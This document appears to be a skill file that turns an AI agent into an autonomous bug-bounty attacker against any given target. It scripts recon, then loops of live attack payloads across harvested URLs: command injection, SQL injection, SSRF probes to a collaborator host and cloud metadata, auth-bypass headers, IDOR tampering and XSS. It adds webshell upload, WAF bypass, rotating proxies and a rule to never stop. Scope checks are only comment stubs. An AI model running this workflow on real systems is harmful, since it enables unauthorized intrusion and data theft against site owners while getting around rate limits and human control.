---
name: auto-hunt
description: "Fully autonomous bug bounty hunter — given any target, runs every phase from recon to report without requiring detailed prompts. Uses a closed-loop verification system: hunt → validate confidence → if <100% → hunt deeper → repeat. Covers all 21+ vulnerability classes across all attack surfaces (web, API, mobile, cloud, infra, LLM). Never stops until every potential attack path is either confirmed with PoC or definitively ruled out. The single skill to load when you want complete coverage with zero blind spots."
---

# Auto-Hunt: Autonomous Full-Spectrum Bug Bounty Hunter

Load this skill when you have a target but no specific direction. This skill runs the **complete** hunting pipeline autonomously — from zero to report — using a closed-loop verification system that keeps digging until every finding is either proven with PoC or definitively ruled out.

---

## Core Loop: Hunt → Verify → Decide → Repeat

```
                ┌──────────────────────────┐
                │   PHASE 0: RECON          │
                │   (subdomains, URLs,      │
                │    tech stack, scope)     │
                └──────────┬───────────────┘
                           ▼
                ┌──────────────────────────┐
                │   PHASE 1: ATTACK SURFACE │
                │   (endpoints, params,     │
                │    auth, entry points)    │
                └──────────┬───────────────┘
                           ▼
                ┌──────────────────────────┐
                │   PHASE 2: VULN HUNT      │
                │   (21+ classes in         │
                │    priority order)        │
                └──────────┬───────────────┘
                           ▼
          ┌─────────────────────────────────┐
          │        VERIFICATION LOOP        │
          │  ┌─────┐   ┌──────┐   ┌─────┐  │
          │  │HUNT │→│VERIFY│→│CONFIDENCE│  │
          │  └─────┘   └──────┘   └─────┘  │
          │       │              │         │
          │       ▼              ▼         │
          │  ┌─────────┐  ┌──────────┐    │
          │  │< 100%?  │  │= 100%?   │    │
          │  │Hunt more│  │Next vuln │    │
          │  └─────────┘  └──────────┘    │
          └─────────────────────────────────┘
                           ▼
                ┌──────────────────────────┐
                │   PHASE 3: EXPLOITATION   │
                │   (working PoC for each)  │
                └──────────┬───────────────┘
                           ▼
                ┌──────────────────────────┐
                │   PHASE 4: REPORT         │
                │   (exec summary, each     │
                │    finding with PoC)      │
                └──────────────────────────┘
```

### The Verification Loop Rules

1. After every hunt action, rate your confidence: 0-100%
2. If confidence < 100% → ask "What am I missing?" → hunt deeper
3. If confidence = 100% → move to next vulnerability class
4. If stuck > 15 minutes → switch classes, come back later
5. Never report a finding without a working PoC (curl command, screenshot, or request/response pair)

---

## Phase 0: Reconnaissance (Automatic)

Run every single one of these. Do not skip any.

### 0.1 Subdomain Enumeration
```bash
# Passive
subfinder -d target.com -o recon/subdomains.txt 2>/dev/null
assetfinder --subs-only target.com >> recon/subdomains.txt 2>/dev/null

# Active
dnsx -l recon/subdomains.txt -o recon/live.txt 2>/dev/null

# Screenshot
httpx -l recon/live.txt -sc -title -tech-detect -o recon/live-enriched.txt 2>/dev/null
```

### 0.2 URL Crawling
```bash
katana -list recon/live.txt -o recon/urls.txt 2>/dev/null
waybackurls target.com > recon/wayback.txt 2>/dev/null
gau target.com > recon/gau.txt 2>/dev/null
cat recon/urls.txt recon/wayback.txt recon/gau.txt | sort -u > recon/all-urls.txt
```

### 0.3 Technology Stack
```bash
# From httpx output: look for tech-detect column
# Also run:
nuclei -l recon/live.txt -tags tech -o recon/tech.txt 2>/dev/null
whatweb target.com -a 3 2>/dev/null | tee recon/whatweb.txt
```

### 0.4 Scope Confirmation
```bash
# Verify target.com and all subdomains are in scope
# Check program page, scope file, bug bounty platform
```

### 0.5 JS Analysis
```bash
cat recon/all-urls.txt | grep "\.js$" > recon/js-files.txt
for js in $(cat recon/js-files.txt); do
  python3 ~/tools/LinkFinder/linkfinder.py -i "$js" -o cli >> recon/js-endpoints.txt 2>/dev/null
  python3 ~/tools/SecretFinder/SecretFinder.py -i "$js" -o cli >> recon/js-secrets.txt 2>/dev/null
done
```

### 0.6 Directory Fuzzing
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -o recon/ffuf.json -of json 2>/dev/null
```

### 0.7 Nuclei Scan
```bash
nuclei -l recon/live.txt -severity critical,high,medium -o recon/nuclei.txt 2>/dev/null
```

---

## Phase 1: Attack Surface Mapping

From recon data, build a ranked attack surface:

### 1.1 Endpoint Classification
```bash
# API endpoints
grep -E "/api/|/v1/|/v2/|/v3/|/graphql|/rest/" recon/all-urls.txt | sort -u > surface/api.txt

# Auth endpoints
grep -E "/login|/signin|/auth|/oauth|/saml|/callback|/logout|/register|/signup" recon/all-urls.txt | sort -u > surface/auth.txt

# Admin/privileged endpoints
grep -E "/admin|/dashboard|/panel|/manage|/config|/settings|/profile" recon/all-urls.txt | sort -u > surface/admin.txt

# File/upload endpoints
grep -E "/upload|/download|/file|/attachment|/media|/image" recon/all-urls.txt | sort -u > surface/files.txt

# IDOR-prone patterns
grep -E "id=|user_id=|account=|document=|order=|ticket=|transaction=" recon/all-urls.txt | sort -u > surface/idor-candidates.txt
```

### 1.2 Parameter Discovery
```bash
arjun -u https://target.com/api/endpoint -o surface/params.txt 2>/dev/null
```

### 1.3 Authenticated Surface (if session provided)
```bash
# Re-run katana with auth headers
katana -u https://target.com -H "Cookie: session=..." -o surface/auth-urls.txt 2>/dev/null
```

---

## Phase 2: Vulnerability Hunting (21+ Classes)

Hunt each class in priority order. For each class, run the verification loop before moving on.

### Priority Order (highest impact first)

```
TIER 1 (Critical/High):  RCE, SQLi, SSRF, Auth Bypass, IDOR
TIER 2 (High/Medium):    XSS, CSRF, SSTI, File Upload, Race Condition
TIER 3 (Medium/Low):     Open Redirect, Cache Poison, Subdomain Takeover, GraphQL, MFA Bypass
TIER 4 (Contextual):     Business Logic, API Misconfig, Cloud Misconfig, LLM Injection, Prototype Pollution, Crypto, Deserialization
```

### 2.1 RCE (Remote Code Execution)
```bash
# Command injection
cat surface/api.txt | while read url; do
  curl -s "$url?cmd=whoami" | grep -q "root\|user\|admin" && echo "CMDi: $url"
  curl -s "$url?host=127.0.0.1;id" | grep -q "uid=" && echo "CMDi: $url"
done

# SSTI probes
cat surface/api.txt | while read url; do
  curl -s "$url?name={{7*7}}" | grep -q "49" && echo "SSTI: $url"
  curl -s "$url?name=\${7*7}" | grep -q "49" && echo "SSTI: $url"
done

# File upload RCE
# Upload webshell via any upload endpoint

# Deserialization
# Check for pickle/java unserialize endpoints
```

**Verification:** Can I execute `whoami` or read `/etc/passwd`? If yes → 100% → PoC. If no → dig deeper (try more payloads, check for blind RCE via OOB).

### 2.2 SQL Injection
```bash
# Time-based blind
cat surface/idor-candidates.txt | while read url; do
  curl -s "$url' AND SLEEP(5)--" -o /dev/null -w "%{time_total}" | grep -q "[5-9]\." && echo "BLIND SQLi: $url"
  curl -s "$url' WAITFOR DELAY '0:0:5'--" -o /dev/null -w "%{time_total}" | grep -q "[5-9]\." && echo "BLIND SQLi: $url"
done

# Error-based
sqlmap -m surface/api.txt --batch --level 3 --risk 2 --random-agent 2>/dev/null

# NoSQL injection
curl -s -X POST "$url" -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

**Verification:** Can I extract data (database name, first row)? If yes → 100% → PoC with data. If time-based only → 70% → try more techniques.

### 2.3 SSRF
```bash
cat surface/api.txt | while read url; do
  # Collaborator-based detection
  curl -s "$url?url=http://YOUR-COLLABORATOR.oastify.com" -o /dev/null
  curl -s "$url?file=http://YOUR-COLLABORATOR.oastify.com" -o /dev/null
  curl -s "$url?image_url=http://YOUR-COLLABORATOR.oastify.com" -o /dev/null
  curl -s "$url?webhook=http://YOUR-COLLABORATOR.oastify.com" -o /dev/null
done

# Cloud metadata
curl -s "$url?url=http://169.254.169.254/latest/meta-data/" | grep -q "ami\|role" && echo "AWS METADATA SSRF: $url"
```

**Verification:** Did I get a callback? If DNS → 50% (need to confirm data access). If I can read metadata → 100%.

### 2.4 Authentication Bypass
```bash
# Direct navigation to protected pages
curl -s -o /dev/null -w "%{http_code}" "https://target.com/admin" | grep -v "401\|403\|302" && echo "NO AUTH: /admin"

# Parameter tampering
curl -s "https://target.com/admin?is_admin=true" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/admin" -H "X-Forwarded-For: 127.0.0.1" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/admin" -H "X-Original-URL: /admin" -o /dev/null -w "%{http_code}"
curl -s "https://target.com/../admin" -o /dev/null -w "%{http_code}"

# JWT manipulation
# Decode JWT → try alg:none → modify payload → re-encode
```

**Verification:** Can I access a page that should require auth? If yes → 100%. If no → try 5 more bypass techniques before giving up.

### 2.5 IDOR (Insecure Direct Object Reference)
```bash
cat surface/idor-candidates.txt | while read endpoint; do
  # Replace your ID with another user's ID
  curl -s "$(echo $endpoint | sed 's/id=[0-9]*/id=1/')"
  curl -s "$(echo $endpoint | sed 's/id=[0-9]*/id=admin/')"
  curl -s "$(echo $endpoint | sed 's/user_id=[0-9]*/user_id=1/')"
  curl -s "$(echo $endpoint | sed 's/account=[0-9a-f]*/account=00000000-0000-0000-0000-000000000001/')"
done

# UUID enumeration
# Try sequential UUIDs, common UUIDs
```

**Verification:** Can I see another user's data (name, email, orders)? If yes → 100% → PoC with two accounts. If response changes but no PII → 60% → dig deeper.

### 2.6 XSS
```bash
# Reflected
cat surface/api.txt | while read url; do
  curl -s "$url?q=<script>alert(1)</script>" | grep -qi "alert(1)" && echo "REFLECTED XSS: $url"
  curl -s "$url?q=<img src=x onerror=alert(1)>" | grep -qi "onerror" && echo "REFLECTED XSS: $url"
done

# Stored — submit XSS payload, then check if it renders
# DOM-based — check JS files for DOM sinks with user input
```

**Verification:** Does the payload execute without filtering? If alert → 100%. If reflected but HTML-encoded → 0% (not exploitable).

### 2.7-2.21 Remaining Classes
For each remaining class, follow the same pattern:
1. Run the automated probes
2. Manually verify each hit
3. Rate confidence 0-100%
4. If < 100% → dig deeper
5. If = 100% → capture PoC → move on

**Template for any class:**
```bash
# Automated probe
for target in $(cat surface/relevant-endpoints.txt); do
  test_payload "$target" "$payload" && echo "HIT: $target"
done

# Manual verification of each hit
# Capture request/response pair as PoC
```

---

## Phase 3: Exploitation & PoC Generation

For each finding at 100% confidence:

### 3.1 Generate Working PoC
```bash
# Exact curl command that reproduces the vulnerability
curl -X GET "https://target.com/vulnerable-endpoint?param=payload" \
  -H "Cookie: session=..." \
  -o /tmp/poc_response.json

# Show the proof
cat /tmp/poc_response.json | head -50
```

### 3.2 Capture Evidence
- Full request/response in HTTP format
- Screenshot if visual proof needed (XSS, ATO)
- Collaborator callback evidence for SSRF/blind
- Data extracted for SQLi

### 3.3 Eliminate False Positives
```bash
# Test with benign payload — should NOT trigger
# Test with malicious payload — SHOULD trigger
# If both trigger → false positive → DISCARD
```

---

## Phase 4: Report Generation

### 4.1 Executive Summary
```
Target: target.com
Date: YYYY-MM-DD
Duration: X hours
Total Findings: X (Critical: X, High: X, Medium: X, Low: X)
Attack Surface: X endpoints across X subdomains
Tech Stack: Python/Flask, PostgreSQL, AWS, Cloudflare
```

### 4.2 Per-Finding Format
```
## [SEVERITY] Vulnerability Title

**Target:** subdomain.target.com/endpoint
**Class:** SQLi / XSS / SSRF / etc
**CVSS:** X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
What the vulnerability is and why it matters.

### Steps to Reproduce
1. Navigate to https://target.com/vulnerable-page
2. Submit payload: ' OR 1=1--
3. Observe: all user data returned

### PoC
```bash
curl -X GET "https://target.com/api/users?id=' OR 1=1--" \
  -H "Cookie: session=..." | jq '.data | length'
```
Returns 1500 records instead of expected 1.

### Impact
Attacker can extract all user PII (names, emails, password hashes).

### Remediation
Use parameterized queries instead of string concatenation.

### References
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
```

### 4.3 Deliverables
- `report.md` — Full report with findings
- `pocs/` — Directory with individual PoC files
- `evidence/` — Screenshots, request/response files

---

## Verification Loop: Complete Logic

```
FOR EACH vulnerability class IN priority_order:
  confidence = 0
  attempts = 0
  techniques_tried = []

  WHILE confidence < 100 AND attempts < MAX_ATTEMPTS:
    technique = SELECT_NEXT_TECHNIQUE(class, techniques_tried)
    result = EXECUTE(technique, target)
    techniques_tried.append(technique)
    attempts += 1

    IF result == CONFIRMED_EXPLOIT:
      confidence = 100
      CAPTURE_POC(result)
      ADD_TO_FINDINGS()
      BREAK

    ELIF result == PARTIAL:
      confidence = MAX(confidence, 40)
      # Dig deeper — try advanced technique

    ELIF result == AMBIGUOUS:
      confidence = MAX(confidence, 10)
      # Try different approach

    ELIF result == NEGATIVE:
      confidence = MIN(confidence, 10)
      # This technique failed, try another

  IF confidence >= 80:
    ADD_TO_FINDINGS("[WEAK] " + class)
  ELSE:
    LOG("RULED OUT: " + class)
```

## Self-Correction Rules

1. **Stuck > 15 minutes** → Switch to next vulnerability class. Come back later.
2. **False positive detected** → Immediately remove from findings. Log the false positive pattern.
3. **Blind finding (OOB only)** → Try to confirm with in-band technique. If impossible → report with OOB evidence.
4. **Auth-required finding** → If you can't get auth, check if session is needed. If public → re-prioritize.
5. **Rate limited** → Back off 60 seconds. Reduce concurrency. Use rotating proxies if available.
6. **WAF blocking** → Try WAF bypass techniques (encoding, header manipulation, HTTP method switching).

## Complete Class Checklist

Run through every class. Check off each one when either proven or ruled out.

- [ ] RCE (command injection, deserialization, SSTI → code exec)
- [ ] SQL Injection (error-based, time-based blind, boolean blind, out-of-band)
- [ ] NoSQL Injection
- [ ] SSRF (cloud metadata, internal services, OOB)
- [ ] Authentication Bypass (direct nav, parameter tampering, JWT manipulation)
- [ ] IDOR (user ID, document ID, account ID enumeration)
- [ ] XSS (reflected, stored, DOM-based)
- [ ] CSRF (no token, predictable token, SameSite bypass)
- [ ] SSTI (template injection without RCE → info disclosure)
- [ ] File Upload (webshell, XSS SVG, XXE in DOCX, path traversal)
- [ ] Race Condition (coupon, vote, transfer, MFA bypass)
- [ ] Open Redirect
- [ ] Cache Poisoning / Web Cache Deception
- [ ] Subdomain Takeover
- [ ] GraphQL (introspection, batching DoS, IDOR via aliases)
- [ ] MFA Bypass (skip, brute, replay, race condition)
- [ ] Business Logic (coupon stacking, negative quantity, price manipulation)
- [ ] API Misconfig (mass assignment, CORS, JWT alg:none, verb tampering)
- [ ] Cloud Misconfig (public S3, open RDS, exposed Lambda)
- [ ] LLM Injection (prompt injection, data exfiltration via tools)
- [ ] Prototype Pollution (JS)
- [ ] Crypto Flaws (weak JWT secret, MD5 passwords, predictable tokens)
- [ ] Deserialization (pickle, PHP unserialize, Java readObject)
- [ ] Path Traversal (file read, LFI)
- [ ] Information Disclosure (stack traces, debug endpoints, verbose errors)
- [ ] Host Header Injection
- [ ] HTTP Request Smuggling
- [ ] WebSocket vulnerabilities
- [ ] NTLM Information Disclosure
- [ ] SAML Attacks (signature stripping, XML wrapping, comment injection)
